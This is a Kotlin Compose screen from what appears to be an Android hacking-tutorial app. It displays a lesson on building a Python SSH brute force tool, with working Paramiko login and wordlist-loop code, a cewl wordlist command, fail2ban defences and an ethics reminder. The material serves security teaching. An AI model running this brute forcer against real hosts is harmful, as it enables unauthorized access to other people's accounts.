package com.example.hackwithpython.projects

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Text
import androidx.compose.material3.Button
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.navigation.NavController

@Composable
fun Project5Screen(navController: NavController) {
    Column(modifier = Modifier
        .padding(16.dp)
        .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.Top,
        horizontalAlignment = Alignment.Start) {
        Text(
            text = "Project 5: SSH Brute Force Tool",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Project Introduction
        Text(
            text = """
                In this project, you will learn how to create a Python-based SSH brute force tool that uses a wordlist 
                to attempt multiple SSH logins until the correct credentials are found. This project will focus on automating 
                brute force attacks and understanding the ethical implications of such tools.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Tools and Libraries Section
        Text(
            text = "Tools and Libraries",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                - **Paramiko**: A Python SSH library used to make SSH connections and perform authentication.
                - **Wordlists**: A list of possible passwords used in brute force attacks.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Steps Section
        Text(
            text = "Steps",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                1. **Install Required Libraries**:
                   Install `paramiko` via pip.
                   ```bash
                   pip install paramiko
                   ```

                2. **Setting Up SSH Connection**:
                   Use the Paramiko library to attempt an SSH connection.
                   ```python
                   import paramiko

                   def attempt_ssh_login(hostname, username, password):
                       try:
                           client = paramiko.SSHClient()
                           client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                           client.connect(hostname, username=username, password=password)
                           print(f"Login successful with password: {password}")
                           return True
                       except paramiko.AuthenticationException:
                           print(f"Failed login attempt with password: {password}")
                           return False
                       finally:
                           client.close()
                   ```

                3. **Brute Force Logic**:
                   Load a wordlist and attempt SSH logins with each password in the wordlist.
                   ```python
                   def brute_force_ssh(hostname, username, wordlist_file):
                       with open(wordlist_file, "r") as file:
                           for password in file:
                               password = password.strip()
                               if attempt_ssh_login(hostname, username, password):
                                   break
                   ```

                4. **Testing the Tool**:
                   Provide an SSH server IP, username, and a wordlist to test the brute force tool.
                   ```python
                   hostname = "192.168.1.1"
                   username = "admin"
                   wordlist_file = "passwords.txt"

                   brute_force_ssh(hostname, username, wordlist_file)
                   ```

                5. **Generating Wordlists**:
                   You can create or download wordlists for the brute force attack. Tools like `cewl` or `crunch` can help in generating wordlists.
                   ```bash
                   cewl http://example.com -m 5 -w wordlist.txt
                   ```

                6. **Protection Against Brute Force Attacks**:
                   Discuss methods to protect against brute force attacks, such as rate limiting, using fail2ban, or disabling password authentication in favor of key-based authentication.
                   ```bash
                   sudo apt-get install fail2ban
                   sudo systemctl enable fail2ban
                   ```

            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Ethical Considerations Section
        Text(
            text = "Ethical Considerations",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                While this project helps you understand brute force attack techniques, it's important to emphasize the ethical implications. 
                Only use this tool in a controlled environment with permission. Brute force attacks on unauthorized systems can lead 
                to legal consequences and are a serious violation of cybersecurity laws.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Conclusion
        Text(
            text = "Conclusion",
            fontWeight = FontWeight.Bold,
            style = androidx.compose.material3.MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                In this project, you built an SSH brute force tool in Python using the Paramiko library and a wordlist. 
                It's crucial to remember the ethical boundaries when using such tools, ensuring you have legal permission 
                before attempting any brute force attack. In the next project, you'll explore more advanced cybersecurity techniques.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        Spacer(modifier = Modifier.height(32.dp))

        // Button to navigate to the next project
        Button(onClick = { navController.navigate("project6") }) {
            Text(text = "Next Project")
        }
    }
}
